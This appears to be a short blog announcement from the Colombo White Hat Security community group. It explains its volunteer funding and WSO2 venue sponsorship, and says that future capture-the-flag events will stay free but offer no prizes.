Colombo White Hat Security group is driven by few individuals who are interested in sharing security knowledge with the local community. Our main intentions are clear in this blog post.

There is no company backing us. WSO2 only sponsors for the venue and the food when there is a meetup session organized by the group.

> In return for the time we spend creating these CTFs and money we spend on maintaining the deployments, etc., all we expect is the feeling that the local community is learning and taking proper advantage of what we do!



Therefore, if we are to provide gifts, t-shirts or awards for the CTF, we won't be able to do more than 1 (or maybe 2) CTFs a year. We don't want to overcomplicate this trying to find new sponsors, etc.

> We'll continue this effort, as long as we feel you are interested.


In summary, future CTF will remain free and open, but there will be no awards or gifts, **as of now**.



> Unless, it is one of the annual CTFs we organize, which will be an offline session with limited and selected number of groups or individuals participating.
>
> Yes! We are thinking about it... :wink:
